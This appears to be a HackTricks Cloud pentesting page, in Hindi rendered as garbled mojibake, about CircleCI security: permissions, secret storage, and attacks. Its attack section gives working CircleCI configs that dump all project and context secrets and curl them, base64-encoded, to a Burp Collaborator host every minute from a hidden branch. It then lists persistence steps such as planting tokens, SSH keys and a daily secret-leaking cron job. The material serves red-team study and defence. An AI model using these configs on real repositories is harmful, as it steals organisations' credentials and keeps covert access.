# CircleCI рд╕реБрд░рдХреНрд╖рд╛

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдорд╛рд░рд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}

### рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) рдПрдХ рдирд┐рд░рдВрддрд░ рдПрдХреАрдХрд░рдг рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдо рд╣реИ рдЬрд╣рд╛рдБ рдЖрдк **рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕** рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдпрд╣ рджрд░реНрд╢рд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдЗрд╕реЗ рдХреБрдЫ рдХреЛрдб рдХреЗ рд╕рд╛рде рдХреНрдпрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ рдХрдм рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдЖрдк **рдкрд░реАрдХреНрд╖рдг** рдпрд╛ **рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ** рдХреЛ рд╕реАрдзреЗ **рдЕрдкрдиреЗ рд░реЗрдкреЛ рдорд╛рд╕реНрдЯрд░ рдмреНрд░рд╛рдВрдЪ** рд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдПред

### рдЕрдиреБрдорддрд┐рдпрд╛рдБ

**CircleCI** **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** github рдФрд░ bitbucket рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕ **рдЦрд╛рддреЗ** рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рдЬреЛ рд▓реЙрдЧ рдЗрди рдХрд░рддрд╛ рд╣реИред\
рдореЗрд░реА рдкрд░реАрдХреНрд╖рдг рдореЗрдВ рдореИрдВрдиреЗ рдпрд╣ рдЬрд╛рдВрдЪрд╛ рдХрд┐ рдЬрдм рддрдХ рдЖрдкрдХреЗ рдкрд╛рд╕ **github рдореЗрдВ рд░реЗрдкреЛ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ, рдЖрдк **CircleCI рдореЗрдВ рдЗрд╕рдХреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ** (рдирдП ssh рдХреБрдВрдЬреА рд╕реЗрдЯ рдХрд░реЗрдВ, рдкреНрд░реЛрдЬреЗрдХреНрдЯ api рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ, рдирдП CircleCI рдХреЙрдиреНрдлрд╝рд┐рдЧреНрд╕ рдХреЗ рд╕рд╛рде рдирдП рдмреНрд░рд╛рдВрдЪ рдмрдирд╛рдПрдВ...)ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдкрдХреЛ **CircleCI рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рд░реЗрдкреЛ рдХреЛ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЗрдкреЛ рдкреНрд░рд╢рд╛рд╕рдХ** рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

### рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдФрд░ рд░рд╣рд╕реНрдп

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░**](https://circleci.com/docs/2.0/env-vars/) рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЗ рднреАрддрд░ **рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдореЗрдВ рдорд╛рди рд▓реЛрдб рдХрд░рдиреЗ** рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВред

#### рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░

CircleCI рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдП рдЧрдП рдкреНрд░рддреНрдпреЗрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣рдореЗрд╢рд╛ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╡рд┐рд╢рд┐рд╖реНрдЯ env vars**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) рд╣реЛрдВрдЧреЗ рдЬреИрд╕реЗ `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` рдпрд╛ `CIRCLE_USERNAME`ред

#### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда

рдЖрдк рдЙрдиреНрд╣реЗрдВ **рдХрдорд╛рдВрдб** рдХреЗ рднреАрддрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **run environment** рдХреЗ рдЕрдВрджрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **build-job environment** рдХреЗ рдЕрдВрджрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
рдЖрдк рдЙрдиреНрд╣реЗрдВ **container рдХреЗ environment** рдХреЗ рдЕрдВрджрд░ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕

рдпреЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕** рд╣реИрдВ рдЬреЛ рдХреЗрд╡рд▓ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ** (рдХрд┐рд╕реА рднреА **рдмреНрд░рд╛рдВрдЪ** рджреНрд╡рд╛рд░рд╛) рджреНрд╡рд╛рд░рд╛ **рдПрдХреНрд╕реЗрд╕рд┐рдмрд▓** рд╣реЛрдВрдЧреЗред\
рдЖрдк рдЗрдиреНрд╣реЗрдВ _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ рдореЗрдВ **рдШреЛрд╖рд┐рдд** рд╣реЛрддреЗ рд╣реБрдП рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
"**рдЗрдВрдкреЛрд░реНрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕**" рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ **рдЕрдиреНрдп рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рд╕реЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдЗрдВрдкреЛрд░реНрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред
{% endhint %}

#### рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕

рдпреЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ **рдСрд░реНрдЧ рд╡рд╛рдЗрдб** рд╣реИрдВред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЛрдИ рднреА рд░реЗрдкреЛ** рдпрд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд **рдХрд┐рд╕реА рднреА рд╕реАрдХреНрд░реЗрдЯ** рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд░ рд╕рдХреЗрдЧрд╛:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдХ рдЕрд▓рдЧ рд╕рдореВрд╣ (рд╕рднреА рд╕рджрд╕реНрдпреЛрдВ рдХреЗ рдмрдЬрд╛рдп) рдХреЛ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рд▓реЛрдЧреЛрдВ рдХреЛ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЪреБрдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред\
рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫреЗ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ, рддрд╛рдХрд┐ рд╕рднреА рдХреЛ рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рди рд╣реЛ рдмрд▓реНрдХрд┐ рдХреЗрд╡рд▓ рдХреБрдЫ рд▓реЛрдЧреЛрдВ рдХреЛред
{% endhint %}

### рд╣рдорд▓реЗ

#### рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рдЦреЛрдЬ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **VCS** (рдЬреИрд╕реЗ github) рддрдХ **рдПрдХреНрд╕реЗрд╕** рд╣реИ, рддреЛ **рдкреНрд░рддреНрдпреЗрдХ рдмреНрд░рд╛рдВрдЪ рдкрд░ рдкреНрд░рддреНрдпреЗрдХ рд░реЗрдкреЛ** рдХреА рдлрд╝рд╛рдЗрд▓ `.circleci/config.yml` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рд╡рд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕рдВрднрд╛рд╡рд┐рдд **рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рд╕реАрдХреНрд░реЗрдЯреНрд╕** рдХреЗ рд▓рд┐рдП **рдЦреЛрдЬреЗрдВ**ред

#### рд╕реАрдХреНрд░реЗрдЯ рдПрдиреНрд╡ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдФрд░ рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ рдПрдиреНрдпреВрдорд░реЗрд╢рди

рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╕рдордп рдЖрдк **рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдирд╛рдо** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдкреНрд░рддреНрдпреЗрдХ `.circleci/config.yml` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдЙрдкрдпреЛрдЧ** рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред рдЖрдк рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рд╕реЗ **рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ рдирд╛рдо** рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЙрдиреНрд╣реЗрдВ рд╡реЗрдм рдХрдВрд╕реЛрд▓ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ред

#### рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░реЗрдВ

{% hint style="warning" %}
**рд╕рднреА** рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдФрд░ рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ **рд╕реАрдХреНрд░реЗрдЯреНрд╕** рдХреЛ **рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рд╕рд┐рд░реНрдл 1 рд░реЗрдкреЛ** рдореЗрдВ **WRITE** рдПрдХреНрд╕реЗрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдкреВрд░реЗ github рдСрд░реНрдЧ рдореЗрдВ (_рдФрд░ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЛ рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╣рд░ рдХреЛрдИ рд╣рд░ рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ_)ред
{% endhint %}

{% hint style="danger" %}
"**рдЗрдВрдкреЛрд░реНрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕**" рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ **рдЕрдиреНрдп рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рд╕реЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдЗрдВрдкреЛрд░реНрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рд╕рднреА рд░реЗрдкреЛ рд╕реЗ рд╕рднреА рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдЗрдВрдкреЛрд░реНрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ **рд╕рднреА рдХреЛ рдПрдХ рд╕рд╛рде рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

рд╕рднреА рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╣рдореЗрд╢рд╛ рдЬреЙрдмреНрд╕ рдХреЗ рдПрдиреНрд╡ рдореЗрдВ рд╕реЗрдЯ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдмрд╕ рдПрдиреНрд╡ рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рдФрд░ рдЗрд╕реЗ рдмреЗрд╕64 рдореЗрдВ рдУрдмрдлрд╕реНрдХреЗрдЯ рдХрд░рдирд╛ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛрдЬрд╝ рд╡реЗрдм рд▓реЙрдЧ рдХрдВрд╕реЛрд▓** рдореЗрдВ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░реЗрдЧрд╛:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ** рдФрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ CircleCI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдмрд╕ **рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рд╣рд░ рдорд┐рдирдЯ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЬреЛ **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдкрддреЗ рдкрд░ рднреЗрдЬрддрд╛ рд╣реИ**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Exfiltrate Context Secrets

рдЖрдкрдХреЛ **рд╕рдВрджрд░реНрдн рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** (рдпрд╣ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рднреА рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдЧрд╛):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╡реЗрдм рдХрдВрд╕реЛрд▓ рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╣реИ** рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **рд░реЗрдкреЛ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ** рдФрд░ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ CircleCI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдмрд╕ **рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **рд╣рд░ рдорд┐рдирдЯ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдЬреЛ **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдкрддреЗ рдкрд░ рднреЗрдЬрддрд╛ рд╣реИ**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
рдмрд╕ рдПрдХ рдирдпрд╛ `.circleci/config.yml` рдПрдХ рд░реЗрдкреЛ рдореЗрдВ рдмрдирд╛рдирд╛ **circleci рдмрд┐рд▓реНрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ**ред рдЖрдкрдХреЛ **рдЗрд╕реЗ circleci рдХрдВрд╕реЛрд▓ рдореЗрдВ рдПрдХ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред
{% endhint %}

#### рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рднрд╛рдЧреЗрдВ

**CircleCI** рдЖрдкрдХреЛ **рдЕрдкрдиреЗ рдмрд┐рд▓реНрдб рдХреЛ рдЙрдирдХреЗ рдорд╢реАрдиреЛрдВ рдпрд╛ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдорд╢реАрдиреЛрдВ рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗрддрд╛ рд╣реИ**ред\
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЙрдирдХреЗ рдорд╢реАрдиреЗрдВ GCP рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИрдВ, рдФрд░ рдЖрдк рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ рдХреБрдЫ рднреА рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рдирд╣реАрдВ рдкрд╛ рд╕рдХреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ рдПрдХ рдкреАрдбрд╝рд┐рдд **рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдорд╢реАрдиреЛрдВ (рд╕рдВрднрд╡рддрдГ, рдПрдХ рдХреНрд▓рд╛рдЙрдб рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ)** рдореЗрдВ рдХрд╛рд░реНрдп рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ **рдХреНрд▓рд╛рдЙрдб рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рд╕рдм рдХреБрдЫ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЖрдк **рдПрдХ VM рдорд╢реАрди рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬрд┐рд╕рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдХреНрд▓рд╛рдЙрдб рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдЬреЛ рдПрдХ рджреВрд░рд╕реНрде рдбреЙрдХрд░ рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪ рд░рдЦрддрд╛ рд╣реИ:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persistence

* рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **CircleCI рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЯреЛрдХрди рдмрдирд╛рдПрдБ** рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣реБрдБрдЪ рдХреЗ рд╕рд╛рде API рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВред
* _https://app.circleci.com/settings/user/tokens_
* рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЯреЛрдХрди рдмрдирд╛рдПрдБ** рддрд╛рдХрд┐ рдЯреЛрдХрди рдХреЛ рджрд┐рдП рдЧрдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░реЛрдЬреЗрдХреНрдЯ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВред
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ SSH рдХреБрдВрдЬреА рдЬреЛрдбрд╝реЗрдВ**ред
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдЫрд┐рдкреА рд╢рд╛рдЦрд╛ рдореЗрдВ рдХреНрд░реЙрди рдЬреЙрдм рдмрдирд╛рдПрдБ** рдХрд┐рд╕реА рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдЬреЛ рд╣рд░ рджрд┐рди рд╕рднреА **context env** рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ **leak** рдХрд░ рд░рд╣рд╛ рд╣реИред
